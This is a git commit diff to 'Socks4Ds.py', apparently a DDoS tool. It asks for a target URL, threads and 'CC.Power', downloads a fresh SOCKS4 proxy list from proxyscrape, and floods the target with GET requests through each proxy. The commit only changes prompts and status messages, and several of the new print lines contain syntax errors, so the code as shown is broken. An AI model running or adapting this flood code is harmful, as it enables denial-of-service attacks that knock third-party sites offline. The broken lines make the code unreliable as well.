c5f9ac78cdcdcd8e6bf5fe24042cc1fdea09663d
Puppet00 <55746456+Puppet00@users.noreply.github.com>
2020-05-28 20:08:09 +0300

    Update Socks4Ds.py

--- Socks4Ds.py
+++ Socks4Ds.py
@@ -171,24 +171,24 @@ def main():
 	global pwr
 	global thr
 	global on
-	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
-	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
-	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
+	url = str(input("[+] URL (http://expample.com) : "))
+	thr = int(input("[+] Threads : "))
+	cho = str(input("[+] Get Some Fresh Socks ? (y/n) : "))
 	if cho =='y':
 		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') 
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
-			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
+			print("[✓] Sucess Get Fresh Socks List !")
 	else:
 		pass
-	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
+	list = str(input("[+] Socks List (socks4.txt): "))
 	if list =="":
-		list = 'socks.txt'
+		list = 'socks4.txt'
 	else:
 		list = str(list)
 	pprr = open(list).readlines()
-	print(Fore.BLUE + "Socks Count : " + Fore.WHITE + "%d " %len(pprr))
-	pwr = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
+	print("[+] Socks Count : "%d " %len(pprr))
+	pwr = int(input("[+] CC.Power (1-100) : "))
 	opth()
 
 def atk():
@@ -210,13 +210,13 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print(Fore.BLUE + "Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
+						print("[+] Socks4 Attack Successful [ " str(proxy[0])+":"+str(proxy[1]) " ] ")
 					s.close
 				except:
 					s.close()
 			except:
 				s.close()
-				print(Fore.RED + "Can't Connet To This Socks . . . Skip ~>" + Fore.WHITE)
+				print("[!] Can't Connet To This Socks")
 
 
 if __name__ == "__main__":
